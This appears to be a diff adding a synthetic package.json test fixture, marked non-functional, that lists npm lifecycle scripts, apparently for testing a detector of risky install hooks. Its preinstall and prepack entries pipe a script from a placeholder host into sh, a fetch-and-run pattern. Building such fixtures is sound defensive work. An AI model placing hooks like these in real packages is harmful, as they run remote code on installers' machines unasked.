@@ -1,0 +1,13 @@
+{
+  "//": "SYNTHETIC TEST FIXTURE — not functional",
+  "name": "fixture",
+  "scripts": {
+    "preinstall": "{{CURL}} -fsSL https://example.invalid/setup.sh | sh",
+    "install": "python -c \"print('hello')\"",
+    "postinstall": "node scripts/setup.js",
+    "prepare": "husky",
+    "prepack": "{{CURL}} https://example.invalid/pack.sh | sh",
+    "prepublishOnly": "node scripts/release.js",
+    "dependencies": "node scripts/deps.js"
+  }
+}
